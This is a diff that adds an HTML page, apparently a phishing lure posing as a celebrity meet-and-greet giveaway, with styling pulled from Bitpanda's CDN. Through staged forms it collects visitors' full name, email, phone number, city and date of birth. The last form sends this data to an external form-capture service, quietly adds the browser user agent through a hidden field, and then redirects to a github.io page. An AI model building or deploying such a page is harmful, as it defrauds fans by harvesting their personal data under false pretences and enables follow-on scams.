@@ -1,0 +1,1124 @@
+
+
+ <!DOCTYPE html>
+<html>
+<head><html class=light lang=en><head><script src="https://www.googleoptimize.com/optimize.js?id=OPT-N3D6ZNP"></script><script>if(document.cookie.match("uc_performance_v1_0=accepted")?.length){
+            window.dataLayer.push({'event': 'optimize.activate'});
+        }</script> <meta charset=utf-8> <meta content="width=device-width, initial-scale=1.0" name=viewport>
+<link href="https://cdn.bitpanda.com/app/v2/css/all.min.css?id=622e023bba9164dff838" rel=stylesheet><script src="https://cdn.bitpanda.com/app/v2/js/head.min.js?id=e37b5634f1d9be3b8e80"></script>
+ 
+
+
+
+
+<title>Celebrity meet and greet</title>
+<style>
+  #mainContent {
+    display: none;
+  }
+  
+  #processing, #processing2 {
+    display: none;
+    text-align: center;
+  }
+  
+  .lds-ring {
+    display: inline-block;
+    position: relative;
+    width: 60px;
+    height: 60px;
+  }
+  
+  .lds-ring div {
+    box-sizing: border-box;
+    display: block;
+    position: absolute;
+    width: 100px;
+    height: 100px;
+    margin: 7px;
+    border: 7px solid #000000;
+    border-radius: 50%;
+    animation: lds-ring 1.9s cubic-bezier(0.5, 0, 0.5, 1) infinite;
+    border-color: Brown transparent transparent transparent;
+  }
+  
+  .lds-ring div:nth-child(1) {
+    animation-delay: -0.55s;
+  }
+  
+  .lds-ring div:nth-child(2) {
+    animation-delay: -0.9s;
+  }
+  
+  .lds-ring div:nth-child(3) {
+    animation-delay: -0.15s;
+  }
+  
+  @keyframes lds-ring {
+    0% {
+      transform: rotate(0deg);
+    }
+    100% {
+      transform: rotate(360deg);
+    }
+  }
+</style>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<style>
+  /* Form Container */
+  #myForm {
+    width: 100%;
+    height: 57px;
+    border-radius: 0px;
+  }
+
+
+  /* Input Fields and Labels */
+  #myForm input, #myForm label {
+    font-size: 18px;
+    font-weight: bold;
+    display: block;
+    border: 3px solid black;
+  }
+
+
+  #myForm input {
+    width: 99%;
+    height: 57px;
+    color: #000000;
+    margin-bottom: 9px;
+    padding: 6px;
+    border-radius: 1px;
+    box-sizing: border-box;
+  }
+
+
+  /* Input Field Focus (when clicked) */
+  #myForm input:focus {
+    outline: none;
+    border-color: #000000;
+  }
+
+
+  /* Labels */
+  #myForm label {
+    margin-bottom: 5px;
+  }
+
+
+  /* Submit Button Spacing */
+  #myForm button {
+    margin-top: 7px;
+  }
+</style>
+
+
+
+
+
+
+
+
+
+
+
+
+<style>
+  /* Form Container */
+  #secondForm {
+    width: 100%;
+    height: 45px;
+    border-radius: 1px;
+  }
+
+
+  /* Input Fields and Labels */
+  #secondForm input, #secondForm label {
+    font-size: 18px;
+    display: block;
+  }
+
+
+  #secondForm input {
+    width: 94%;
+    height: 45px;
+    color: black;
+    margin-bottom: 9px;
+    padding: 6px;
+    border-radius: 2px;
+    box-sizing: border-box;
+  }
+
+
+  /* Input Field Focus (when clicked) */
+  #secondForm input:focus {
+    outline: none;
+    border-color: Red;
+  }
+
+
+  /* Labels */
+  #secondForm label {
+    margin-bottom: 5px;
+  }
+
+
+  /* Submit Button Spacing */
+  #secondForm button {
+    margin-top: 7px;
+  }
+</style>
+
+
+
+
+
+
+
+
+<script>
+  function submitForm() {
+    // Hide the form
+    document.getElementById("myForm").style.display = "none";
+    
+    // Display the "Processing" message and animation
+    document.getElementById("processing").style.display = "block";
+    
+    // Delay displaying the main content
+    setTimeout(function() {
+      // Hide the processing message and animation
+      document.getElementById("processing").style.display = "none";
+      
+      // Display the main content
+      document.getElementById("mainContent").style.display = "block";
+      
+      // Get the form data
+      const name = document.getElementById("name").value;
+      const email = document.getElementById("email").value;
+      const phoneNumber = document.getElementById("phonenumber").value; // Get phone number
+      
+      // Display the submitted form data in multiple places within the main content
+      const submittedNameElements = document.getElementsByClassName("submittedName");
+      const submittedEmailElements = document.getElementsByClassName("submittedEmail");
+      const submittedPhoneElements = document.getElementsByClassName("submittedPhone"); // Handle phone number
+      
+      for (let i = 0; i < submittedNameElements.length; i++) {
+        submittedNameElements[i].textContent = name;
+      }
+      
+      for (let i = 0; i < submittedEmailElements.length; i++) {
+        submittedEmailElements[i].textContent = email;
+      }
+      
+      for (let i = 0; i < submittedPhoneElements.length; i++) {
+        submittedPhoneElements[i].textContent = phoneNumber; // Display phone number
+      }
+      
+      // Scroll to the main content section
+      document.getElementById("mainContent").scrollIntoView({ behavior: 'smooth' });
+    }, 2000); // Change delay to 3 seconds
+  }
+
+
+  function submitSecondForm() {
+    // Hide the second form
+    document.getElementById("secondForm").style.display = "none";
+    
+    // Display the "Processing" message for the second form
+    document.getElementById("processing2").style.display = "block";
+    
+    // Delay displaying the second form's main content
+    setTimeout(function() {
+      // Hide the processing message for the second form
+      document.getElementById("processing2").style.display = "none";
+      
+      // Display the second form's submitted content
+      const mainContent2 = document.getElementById("mainContent2");
+      mainContent2.style.display = "block";
+      
+      // Get the second form data
+      const fullName = document.getElementById("fullName").value;
+      const email2 = document.getElementById("email2").value;
+      const phone2 = document.getElementById("phone2").value;
+      const address = document.getElementById("address").value;
+      const city = document.getElementById("city").value;
+      const country = document.getElementById("country").value;
+
+
+      // Set the submitted data to specific elements
+      document.querySelectorAll(".submittedFullName").forEach(el => el.textContent = fullName);
+      document.querySelectorAll(".submittedEmail2").forEach(el => el.textContent = email2);
+      document.querySelectorAll(".submittedPhone2").forEach(el => el.textContent = phone2);
+      document.querySelectorAll(".submittedAddress").forEach(el => el.textContent = address);
+      document.querySelectorAll(".submittedCity").forEach(el => el.textContent = city);
+      document.querySelectorAll(".submittedCountry").forEach(el => el.textContent = country);
+
+
+      // Scroll to the second form's main content
+      mainContent2.scrollIntoView({ behavior: 'smooth' });
+    }, 2000); // Change delay to 3 seconds
+  }
+</script>
+</head>
+<body>
+
+
+
+
+<div> 
+  <div class="formbold-form-wrapper">
+  	
+  
+  
+
+
+    <!-- Original Form -->
+    <form id="myForm" onsubmit="submitForm(); return false;">
+
+
+
+
+      
+
+
+
+
+
+
+<img style="display: block;-webkit-user-select: none;max-width: 100%;margin: auto;background-color: hsl(0, 0%, 90%);transition: background-color 300ms;" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSqgMrS-xdYFbG8Mv8IFgM6ixVG8RfwVnkBxw&amp;amp;usqp=CAU">
+
+
+<style>
+  .text-107px {
+    font-size: 20px;
+    padding: 9px;
+    color: #000000;
+  }
+</style>
+
+
+
+
+<p class="text-107px">
+
+
+<br>
+
+
+
+
+
+
+
+
+The meet and greet event is back. Connecting fans with their favorite celebrity singer  since 1997.
+
+
+This is your chance to experience a meet and greet which includes an intimate dinner with your favorite celebrity.
+
+
+
+
+
+
+
+
+<script>
+function validateInput(input) {
+  var minLength = 5;
+  var maxLength = 28;
+  var errorMessage = document.getElementById("error-message");
+
+
+  if (input.value.length < minLength || input.value.length > maxLength) {
+    errorMessage.textContent = "";
+    input.setCustomValidity("Enter  name of celebrity");
+  } else {
+    errorMessage.textContent = "";
+    input.setCustomValidity("");
+  }
+}
+</script>
+
+
+
+
+<br>
+
+
+
+
+
+
+      
+      <div id="error-message"></div>
+
+
+      <div class="formbold-mb-5">
+      	
+ 
+      
+   <strong>   <font color="#000000">
+To proceed, enter the name of the Celebrity you'd like to meet below;</strong>
+        <center>
+
+
+
+
+
+
+          <input type="text" required name="A_" id="name" placeholder="Enter Name of celebrity you'd like to meet" 
+          
+          oninput="validateInput(this)"
+          
+class="formbold-form-input" />
+        </center>
+
+
+
+
+      </div>
+
+
+
+
+
+
+
+
+
+
+
+
+ <div class="formbold-mb-5">
+        <center>
+          <input type="text" 
+
+
+ class="formbold-form-input" 
+
+
+style="display: none;  
+placeholder="How long have you been a fan?" />
+        </center>
+      </div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+      <div class="formbold-mb-5">
+        <center>
+          <input type="text" id="email" 
+
+
+style="display: none;  
+
+
+ name="A_" class="formbold-form-input" placeholder="Enter your first and last name" />
+        </center>
+      </div>
+
+
+
+
+
+
+
+
+      <center>
+        <input type="text" id="phonenumber" name="A_" placeholder="Enter the name of your city"  
+style="display: none;  
+class="formbold-form-input" />
+      </center>
+
+
+
+
+<div>
+        <center> 
+<button type="submit" style="width: 97%; height: 42px; border: 0px solid #000; border-radius: 30px; background-color: #0093D5; color: #ffffff; font-size: 23px; font-weight: bold; cursor: pointer;">CONTINUE</button></center>
+
+
+
+
+</p>
+
+
+
+
+
+
+
+
+<br><br><br><br><br><br>
+      </div>
+    </form>
+
+
+  </div>
+</div>
+
+
+<div id="processing">
+  <h4><br><br><br><br>Processing....</h4>
+  <div class="lds-ring">
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+  </div>
+</div>
+
+
+<div id="mainContent">
+
+
+
+
+
+
+  
+
+
+  <!-- New Form -->
+  <form id="secondForm" onsubmit="submitSecondForm(); return false;">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<style>
+  .text-amakapx {
+    font-size: 24px;
+    padding: 9px;
+  }
+</style>
+<h5 class="text-amakapx">
+ 
+
+
+<strong>
+<span class="submittedName"></span>  Meet and Greet</strong></strong>
+</h5>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<style>
+  .text-amaklovpx {
+    font-size: 19px;
+    padding: 9px;
+  }
+</style>
+<h5 class="text-amaklovpx">
+ 
+
+
+You can now register for the <span class="submittedName"></span>  meet and greet for a chance to experience an intimate dinner with the legendary <span class="submittedName"></span>  himself. 
+
+
+<br><br>
+
+
+Tap on Learn More to learn more about how you can register for a chance to win an intimate dinner with <span class="submittedName"></span>.
+
+
+
+
+    <div class="formbold-mb-5">
+        <center>
+        <input type="text" 
+style="display: none;  id="fullName" placeholder="Enter Full Name"  class="formbold-form-input" />
+      </center>
+    </div>
+
+
+   
+    <center>
+      <input type="email"
+style="display: none;  id="email2" placeholder="Enter Email" class="formbold-form-input" />
+    </center>
+
+
+    
+    <center>
+      <input type="text" style="display: none;  id="phone2" placeholder="Enter Phone Number" class="formbold-form-input" />
+    </center>
+
+
+    
+    <center>
+      <input type="text" style="display: none;  id="address" placeholder="Enter Address" class="formbold-form-input" />
+    </center>
+
+
+   
+    <center>
+      <input type="text" style="display: none;  id="city" placeholder="Enter City" class="formbold-form-input" />
+    </center>
+
+
+    
+    <center>
+      <input type="text"
+style="display: none; 
+ id="country" placeholder="Enter Country" class="formbold-form-input" />
+    </center>
+
+
+    <div>
+     
+
+
+ <center> 
+<button type="submit" style="width: 97%; height: 49px; border: 0px solid #000; border-radius: 30px; background-color: #0093D5; color: #ffffff; font-size: 18px; font-weight: bold; cursor: pointer;">Learn More</button></center>
+
+
+
+
+    </div>
+
+
+
+
+<br><br><br><br><br><br>
+<br><br><br><br><br><br>
+  </form>
+</div>
+
+
+<div id="processing2">
+  
+
+
+
+
+
+
+
+
+<style>
+  .text-deborahpx {
+    font-size: 22px;
+    padding: 5px;
+  }
+</style>
+<h5 class="text-deborahpx">
+ <br><br><br><br><br><br>
+
+
+<strong> 
+
+
+Processing...
+</strong>
+</h5>
+
+
+
+
+
+
+  <div class="lds-ring">
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+  </div>
+</div>
+
+
+<div id="mainContent2" style="display: none;">
+
+
+
+
+
+
+
+
+
+
+<style>
+  .text-precpx {
+    font-size: 19px;
+    padding: 10px;
+  }
+</style>
+<h5 class="text-precpx">
+ 
+ 
+ 
+ 
+ Register now for a chance to win an exclusive meet and greet, complete with an
+intimate dinner 
+ with <span class="submittedName"></span>.
+<br><br>
+
+
+ The best part? You'll receive instant feedback on whether your application is approved or rejected, eliminating the need to wait days.
+
+
+ 
+ <br>
+ 
+ 
+
+
+  <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 1px;
+        }
+
+
+        /* Styling for the container of the split input field (two boxes) */
+        .split-input-container {
+            display: flex;
+            gap: 10px; /* Space between the two boxes */
+        }
+
+
+        .split-input {
+            width: 50%; /* Each box takes 50% of the container */
+            height: 45px;
+            border: 2px solid #000000;
+            border-radius: 7px;
+            font-size: 18px;
+            font-weight: bold;
+            padding: 0 10px;
+            box-sizing: border-box;
+        }
+
+
+        .split-input:focus {
+            outline: none;
+            border-color: #007bff; /* Change border color on focus */
+        }
+
+
+        /* Styling for the container of the three-box input field */
+        .three-input-container {
+            display: flex;
+            gap: 10px; /* Space between the three boxes */
+        }
+
+
+        .three-input {
+            width: 33%; /* Each box takes one-third of the container */
+            height: 45px;
+            border: 2px solid #000000;
+            border-radius: 7px;
+            font-size: 18px;
+            font-weight: bold;
+            padding: 0 10px;
+            box-sizing: border-box;
+        }
+
+
+        .three-input:focus {
+            outline: none;
+            border-color: #007bff; /* Change border color on focus */
+        }
+
+
+        /* Styling for other input fields */
+        .input-fieldy {
+            width: 100%;
+            height: 45px;
+            border: 2px solid #000000;
+            border-radius: 7px;
+            font-size: 18px;
+            font-weight: bold;
+            padding: 0 10px;
+            box-sizing: border-box;
+        }
+
+
+        .input-fieldy:focus {
+            outline: none;
+            border-color: #007bff; /* Change border color on focus */
+        }
+    </style>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+ <form action="https://submit-form.com/ocj5FJt4c" method="POST" id="wpforms-form-278" class="wpforms-validate wpforms-form" data-formid="278">
+
+
+
+
+
+
+<input type="hidden" name="_redirect" value="https://enjoy-org.github.io/.Apply/" >
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<style>
+  .text-amakapx {
+    font-size: 18px;
+    padding: 9px;
+  }
+</style>
+
+
+
+
+<h5 class="text-amakapx">
+ 
+
+
+
+
+
+
+
+
+
+
+
+
+    <!-- Split input field (two boxes) -->
+ <strong>
+Enter Your Full Name   
+
+
+
+
+<div class="split-input-container">
+
+
+
+
+        <input type="text" class="split-input" name="a_First_Name_Celeb" required placeholder="First Name">
+
+
+
+
+        <input type="text" class="split-input" name="b_Last_Name_Celeb"  placeholder="Last Name">
+    </div>
+
+
+<br><br>
+
+
+
+
+    <!-- Other input field -->
+Email
+    <input type="text" class="input-fieldy" name="c_Email" required placeholder="Enter your email">
+<br>
+<br>
+<br>
+
+
+    <!-- Other input field -->
+Phone  Number 
+    <input type="text" class="input-fieldy"
+
+
+ name="d_Phone_NUMBER" required 
+
+
+placeholder="Enter your phone number">
+
+
+<br>
+<br>
+<br>
+
+
+
+
+    <!-- Other input field -->
+Enter the name of the Celebrity you'd like to meet
+    <input type="text" class="input-fieldy"
+name="e_Celebrity_Name" required 
+
+
+ placeholder="Celebrity you'd like to meet">
+
+
+<br><br>
+<br>
+
+
+    <!-- Other input field -->
+Enter  your  city
+    <input type="text" class="input-fieldy" name="f_City" required placeholder="Enter  your  city">
+
+
+
+
+
+
+
+
+<br><br><br><br>
+<center>
+You must be over 18 years old
+<br></center>
+<br>
+
+
+    <!-- Three-box input field -->
+
+
+
+
+Enter  Your  Date  Of Birth<div class="three-input-container">
+       
+
+
+ <input type="text" name="g_Month_of_Birth" required class="three-input" placeholder="Month">
+        
+<input type="text" class="three-input" 
+
+
+
+
+name="h_Day_of_birth" required
+
+
+placeholder="Day">
+        
+
+
+
+
+
+
+<input type="text" class="three-input" 
+
+
+name="z_Year_of_birth" required
+
+
+placeholder="Year">
+
+
+
+
+    </div>
+
+
+</strong>
+
+
+
+
+<br>
+	
+	
+<span style="display:none;">
+
+
+    <p id="user-agent"></p> </span>
+        <input type="hidden" name="z_PhoneDetails" id="hidden-user-agent">
+        	
+
+
+
+
+	
+<button  type="submit"
+style="width: 100%; height: 49px; border: 0px solid #000; border-radius: 30px; background-color: #0093D5; color: #ffffff; font-size: 24px; font-weight: bold; cursor: pointer;">Continue</button>
+
+
+
+
+</form>
+
+
+
+
+
+
+
+
+<script>
+        const userAgent = navigator.userAgent;
+        document.getElementById('user-agent').textContent = userAgent;
+        document.getElementById('hidden-user-agent').value = userAgent;
+    </script>
+ 
+
+
+
+
+
+
+
+
+
+
+<br><br><br><br><br>
+
+
+
+
+</h5>
+
+
+
+
+
+
+<font style="display: none;">
+ 
+
+
+<span class="submittedFullName"></span>
+
+
+
+
+ <span class="submittedEmail2"></span>
+    
+
+
+<span class="submittedPhone2"></span>
+    
+
+
+ <span class="submittedAddress"></span>
+
+
+
+
+    <span class="submittedCity"></span>
+
+
+
+
+  <span class="submittedCountry"></span>
+
+
+    <span class="submittedEmail"></span>
+
+
+ <span class="submittedName"></span> 
+
+
+<span class="submittedPhone"></span> 
+</font>
+
+
+
+
+
+
+
+
+
+
+
+
+</div>
+
+
+
+
+<script>
+  // Ensure both forms and processing sections are hidden initially
+  document.getElementById("processing").style.display = "none";
+  document.getElementById("processing2").style.display = "none";
+  document.getElementById("myForm").style.display = "block";
+</script>
+</body>
+</html>
+
